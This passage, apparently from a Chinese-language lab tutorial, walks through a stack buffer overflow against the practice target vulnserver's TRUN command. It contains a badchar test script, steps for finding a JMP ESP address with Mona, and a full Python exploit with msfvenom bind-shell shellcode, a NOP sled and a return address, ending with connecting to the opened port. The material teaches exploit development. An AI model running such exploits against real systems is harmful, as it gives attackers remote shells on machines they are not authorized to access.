    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    buffer = "A"*2002
    buffer += "BBBB"
    buffer += badchars
    buffer += "C"*(5000-len(buffer))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    print "[+] Sending exploit..."
    s.send("TRUN /.:/ " + buffer)
    print s.recv(1024)
    s.close()
在进行测试更新后的缓冲区后，内存转储显示出了所有的测试字符（\x01到\xFF）。这也就意味着，唯一有问题字符就是NULL字节（\x00）。
我们下一步就是要找到一个包含JMP
ESP指令的地址。我们建议使用应用程序本身的地址，或者应用程序自带的DLL。这样做的目的是为了兼容。也就意味着即使应用程序被安装在不同类型的机器上，该漏洞也会有效。在这个例子中，我从vulnserver.exe中使用的essfunc.dll模块中搜索了一条JMP
ESP指令。我使用了Mona命令的结果中的第一个地址（0x625011AF）！Mona jmp -r esp -m
"essfunc.dll"。这个地址是一个很好的利用地址，因为它没有保护机制。
那么我们 的下一步就是使用msfvenom生成shellcode
利用我之前收集的所有信息（包含JMP
ESP指令的地址和shellcode），我将漏洞利用代码修改为以下内容。我还在shellcode之前添加了一个nopsled（16
NOP指令），这可以为下一步的编译程序开辟空间。
    #!/usr/bin/python
    import socket
    import os
    import sys
    host = "192.168.1.129"
    port = 9999
    # msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
    # Payload size: 355 bytes
    shellcode = ("\xdb\xcd\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\xbb\x44\xdc\x09"
    "\x7b\x31\x5a\x17\x83\xc2\x04\x03\x1e\xcf\xeb\x8e\x62\x07\x69"
    "\x70\x9a\xd8\x0e\xf8\x7f\xe9\x0e\x9e\xf4\x5a\xbf\xd4\x58\x57"
    "\x34\xb8\x48\xec\x38\x15\x7f\x45\xf6\x43\x4e\x56\xab\xb0\xd1"
    "\xd4\xb6\xe4\x31\xe4\x78\xf9\x30\x21\x64\xf0\x60\xfa\xe2\xa7"
    "\x94\x8f\xbf\x7b\x1f\xc3\x2e\xfc\xfc\x94\x51\x2d\x53\xae\x0b"
    "\xed\x52\x63\x20\xa4\x4c\x60\x0d\x7e\xe7\x52\xf9\x81\x21\xab"
    "\x02\x2d\x0c\x03\xf1\x2f\x49\xa4\xea\x45\xa3\xd6\x97\x5d\x70"
    "\xa4\x43\xeb\x62\x0e\x07\x4b\x4e\xae\xc4\x0a\x05\xbc\xa1\x59"
    "\x41\xa1\x34\x8d\xfa\xdd\xbd\x30\x2c\x54\x85\x16\xe8\x3c\x5d"
    "\x36\xa9\x98\x30\x47\xa9\x42\xec\xed\xa2\x6f\xf9\x9f\xe9\xe7"
    "\xce\xad\x11\xf8\x58\xa5\x62\xca\xc7\x1d\xec\x66\x8f\xbb\xeb"
    "\x89\xba\x7c\x63\x74\x45\x7d\xaa\xb3\x11\x2d\xc4\x12\x1a\xa6"
    "\x14\x9a\xcf\x53\x1c\x3d\xa0\x41\xe1\xfd\x10\xc6\x49\x96\x7a"
    "\xc9\xb6\x86\x84\x03\xdf\x2f\x79\xac\xce\xf3\xf4\x4a\x9a\x1b"
    "\x51\xc4\x32\xde\x86\xdd\xa5\x21\xed\x75\x41\x69\xe7\x42\x6e"
    "\x6a\x2d\xe5\xf8\xe1\x22\x31\x19\xf6\x6e\x11\x4e\x61\xe4\xf0"
    "\x3d\x13\xf9\xd8\xd5\xb0\x68\x87\x25\xbe\x90\x10\x72\x97\x67"
    "\x69\x16\x05\xd1\xc3\x04\xd4\x87\x2c\x8c\x03\x74\xb2\x0d\xc1"
    "\xc0\x90\x1d\x1f\xc8\x9c\x49\xcf\x9f\x4a\x27\xa9\x49\x3d\x91"
    "\x63\x25\x97\x75\xf5\x05\x28\x03\xfa\x43\xde\xeb\x4b\x3a\xa7"
    "\x14\x63\xaa\x2f\x6d\x99\x4a\xcf\xa4\x19\x6a\x32\x6c\x54\x03"
    "\xeb\xe5\xd5\x4e\x0c\xd0\x1a\x77\x8f\xd0\xe2\x8c\x8f\x91\xe7"
    "\xc9\x17\x4a\x9a\x42\xf2\x6c\x09\x62\xd7")
    buffer = "A"*2002
    buffer += "\xAF\x11\x50\x62"        # 625011AF   JMP ESP from essfunc.dll
    buffer += "\x90"*16                 # nopsled
    buffer += shellcode
    buffer += "C"*(5000-len(buffer))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    print "[+] Sending exploit..."
    s.send("TRUN /.:/ " + buffer)
    print s.recv(1024)
    s.close()
在运行了最终的漏洞利用代码后，shellcode起作用了，目标机在4444/tcp上打开了一个 "监听 "端口。
那么我们最后要做的就是连接到新打开的端口，获得一个shell。